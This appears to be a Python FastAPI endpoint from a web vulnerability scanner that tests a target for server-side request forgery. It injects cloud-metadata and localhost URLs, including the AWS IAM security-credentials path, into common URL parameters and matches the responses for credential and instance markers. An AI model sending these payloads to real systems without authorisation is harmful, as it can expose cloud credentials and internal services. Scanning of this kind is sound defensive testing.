"""SSRF — cloud-metadata + localhost marker verification."""
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_get, wrap_finding, standard_response)
router = APIRouter()
_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/",
     r"ami-id|instance-id|hostname|local-ipv4|public-keys", "AWS IMDS"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     r"AccessKeyId|SecretAccessKey|Token", "AWS IAM creds"),
    ("http://metadata.google.internal/computeMetadata/v1/",
     r"instance/|project/|service-accounts", "GCP metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     r"compute|networkInterface|vmId", "Azure metadata"),
    ("http://169.254.169.254/metadata/v1/",
     r"droplet_id|interfaces|hostname", "DigitalOcean metadata"),
    ("http://localhost/", r"<html|<title|<body", "localhost reachable"),
    ("http://127.0.0.1/", r"<html|<title|<body", "127.0.0.1 reachable"),
]
_COMMON_KEYS = ["url","uri","src","fetch","image","img","avatar","callback","redirect","webhook","proxy","host"]

@router.post("/api/scan/ssrf")
async def scan_ssrf(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target)
    parsed = urlparse(base)
    existing = parse_qs(parsed.query)
    candidates = set(existing.keys()) | set(_COMMON_KEYS)
    if not candidates:
        return standard_response(tool="ssrf", target=req.target, findings=[],
            tests_performed=1, vulnerable=False,
            skipped_reason="No URL parameters — append ?url=http://... to test")
    findings, tests, confirmed = [], 0, []
    for key in candidates:
        for ssrf_url, marker, cloud in _PAYLOADS:
            tests += 1
            new_params = {k: v[0] for k, v in existing.items()}
            new_params[key] = ssrf_url
            test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
            extra = {"Metadata-Flavor": "Google"} if "metadata.google" in ssrf_url else {}
            r = safe_get(test_url, headers=extra, req=req, allow_redirects=False, timeout=10)
            if r is None or r.status_code != 200: continue
            try:
                if re.search(marker, (r.text or "")[:8000], re.IGNORECASE):
                    findings.append(wrap_finding(
                        f"SSRF — param {key!r} reaches {cloud}",
                        "CRITICAL", cvss="9.1", cwe="CWE-918", owasp="A10:2021",
                        remediation="Validate URLs against allow-list. Reject private IP ranges (10/8, 172.16/12, 192.168/16, 169.254/16, 127/8).",
                        evidence_marker=f"param={key} payload {ssrf_url!r} returned content matching {marker!r} ({cloud})"))
                    confirmed.append({"param": key, "payload": ssrf_url, "cloud": cloud})
                    break
            except re.error: continue
    return standard_response(tool="ssrf", target=req.target, findings=findings,
        tests_performed=tests,
        tests_summary=f"SSRF: {tests} probes across {len(candidates)} params; AWS/GCP/Azure/DO + localhost markers",
        raw_data={"ssrf": {"confirmed": confirmed}})
def register(app): app.include_router(router)
